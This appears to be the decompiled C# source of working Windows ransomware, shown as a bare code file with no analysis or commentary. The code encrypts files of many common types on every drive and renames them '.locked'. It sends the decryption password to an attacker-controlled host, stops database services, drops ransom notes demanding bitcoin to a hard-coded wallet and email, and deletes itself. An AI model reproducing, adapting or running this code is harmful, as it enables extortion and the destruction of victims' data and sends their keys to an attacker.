using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace hidden;

internal class Program
{
	private static string targetURL = "http://concreteshogun.ddns.net/Server/write.php";

	private static string targetURLs = "https://concreteshogun.ddns.net/Server/write.php";

	private static string Baddress = "1KV34BcBk2SNmpULH16E7oLGup3Pj6ywFD";

	private static string email = "Concreteshogun@pm.me";

	private string computerName = Environment.MachineName.ToString();

	private int js;

	private string sID;

	private static Program instance = new Program();

	private static void Main(string[] args)
	{
		if (RunningInstance() == null)
		{
			bool flag = Regyy();
			if (CheckForInternetConnection() && flag)
			{
				instance.startAction();
			}
			else
			{
				Console.WriteLine("erro！");
			}
		}
	}

	public static Process RunningInstance()
	{
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.Id != currentProcess.Id && process.ProcessName == currentProcess.ProcessName)
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static bool Regyy()
	{
		string text = "RegistrySetValueExample";
		if ((string)Registry.GetValue("HKEY_CURRENT_USER\\Software" + "\\" + text, "TestExpand", "Default if TestExpand does not exist.") == "45IvNtfp7mJJ")
		{
			return false;
		}
		return true;
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		try
		{
			string text = "?computer_name=" + computerName + "&sID=" + sID + "&password=" + password + "&allow=ransom";
			string address = targetURLs + text;
			new WebClient().DownloadString(address);
		}
		catch (Exception)
		{
		}
	}

	public void EncryptFile(string file, string password)
	{
		try
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
			File.Move(file, file + ".locked");
		}
		catch (IOException ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void encryptDirectory(DirectoryInfo dir, string password)
	{
		try
		{
			string[] source = new string[57]
			{
				".txt", ".mdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg",
				".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html",
				".htm", ".psd", ".js", ".pdf", ".c", ".cs", ".mp3", ".mp4", ".f3d", ".dwg",
				".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".7-zip",
				".ace", ".arj", ".bz2", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001",
				".core", ".crproj", ".pdb", ".bak", ".pas", ".db", ".back"
			};
			FileInfo[] files = dir.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				string extension = Path.GetExtension(fileInfo.FullName);
				string fileName = Path.GetFileName(fileInfo.FullName);
				string directoryName = Path.GetDirectoryName(fileInfo.FullName);
				if (source.Contains(extension) && fileName != "READ_IT.txt" && fileName != "master.mdf" && fileName != "model.mdf" && fileName != "mssqlsystemresource.mdf")
				{
					EncryptFile(fileInfo.FullName, password);
					messageCreator(directoryName);
					js++;
					if (js == 1)
					{
						SendPassword(password);
						addgre();
					}
				}
			}
		}
		catch (StackOverflowException ex)
		{
			Console.WriteLine(ex.Message);
		}
		catch (UnauthorizedAccessException ex2)
		{
			Console.WriteLine(ex2.Message);
		}
		catch (IOException ex3)
		{
			Console.WriteLine(ex3.Message);
		}
		try
		{
			DirectoryInfo[] directories = dir.GetDirectories();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			DirectoryInfo[] array = directories;
			foreach (DirectoryInfo directoryInfo in array)
			{
				if (directoryInfo.FullName != folderPath)
				{
					encryptDirectory(directoryInfo, password);
				}
			}
		}
		catch (StackOverflowException ex4)
		{
			Console.WriteLine(ex4.Message);
		}
		catch (UnauthorizedAccessException ex5)
		{
			Console.WriteLine(ex5.Message);
		}
		catch (IOException ex6)
		{
			Console.WriteLine(ex6.Message);
		}
	}

	public void startAction()
	{
		string password = CreatePassword(16);
		sID = FingerPrint.Value();
		DriveInfo[] drives = DriveInfo.GetDrives();
		SystemServices.SystemServiceClose("MSSQLSERVER");
		SystemServices.SystemServiceClose("mysql");
		messageDesktop();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				DirectoryInfo dir = new DirectoryInfo(driveInfo.Name);
				encryptDirectory(dir, password);
			}
		}
		SystemServices.SystemServiceOpen("MSSQLSERVER");
		SystemServices.SystemServiceOpen("mysql");
		password = null;
		DeleteItself();
	}

	private static void DeleteItself()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		string text = Path.GetDirectoryName(fileName) + "\\DeleteItself.bat";
		using (StreamWriter streamWriter = new StreamWriter(text, append: false, Encoding.Default))
		{
			streamWriter.Write(string.Format(":del\r\n del \"{0}\"\r\nif exist \"{0}\" goto del\r\ndel \"{1}\"\r\n", fileName, text));
		}
		WinExec(text, 0u);
		Process.GetCurrentProcess().Kill();
	}

	[DllImport("kernel32.dll")]
	public static extern uint WinExec(string lpCmdLine, uint uCmdShow);

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead(targetURL))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void messageCreator(string udir)
	{
		string text = "\\READ_IT.txt";
		string path = udir + text;
		string[] contents = new string[15]
		{
			"ATENTION!!!",
			"\r",
			"I am truly sorry to inform you that all your important files are crypted.",
			"Atention!I do not offer for free the decrypt key's, for that you have to pay 0.05 BITCOIN.",
			"\r",
			"You can get bitcoin very easy on this site: www.localbitcoins.com",
			"You have to create an account and to buy 0.05 BITCOIN from a seller located in your city.",
			"Then you have to send the amount at this BTC adress: " + Baddress,
			"After that, contact me at this email adress: " + email,
			"With this subject: " + sID,
			"\r",
			"After the payment you will receive the key's to decrypt your files and a tutorial",
			"\r",
			"Here is another list where you can buy bitcoin:",
			"https://bitcoin.org/en/exchanges"
		};
		File.WriteAllLines(path, contents);
	}

	public void messageDesktop()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
		string text = "\\READ_IT.txt";
		string path = folderPath + text;
		string[] contents = new string[15]
		{
			"ATENTION!!!",
			"\r",
			"I am truly sorry to inform you that all your important files are crypted.",
			"Atention!I do not offer for free the decrypt key's, for that you have to pay 0.05 BITCOIN.",
			"\r",
			"You can get bitcoin very easy on this site: www.localbitcoins.com",
			"You have to create an account and to buy 0.05 BITCOIN from a seller located in your city.",
			"Then you have to send the amount at this BTC adress: " + Baddress,
			"After that, contact me at this email adress: " + email,
			"With this subject: " + sID,
			"\r",
			"After the payment you will receive the key's to decrypt your files and a tutorial",
			"\r",
			"Here is another list where you can buy bitcoin:",
			"https://bitcoin.org/en/exchanges"
		};
		File.WriteAllLines(path, contents);
	}

	public void addgre()
	{
		string text = "RegistrySetValueExample";
		Registry.SetValue("HKEY_CURRENT_USER\\Software" + "\\" + text, "TestExpand", "45IvNtfp7mJJ");
	}
}
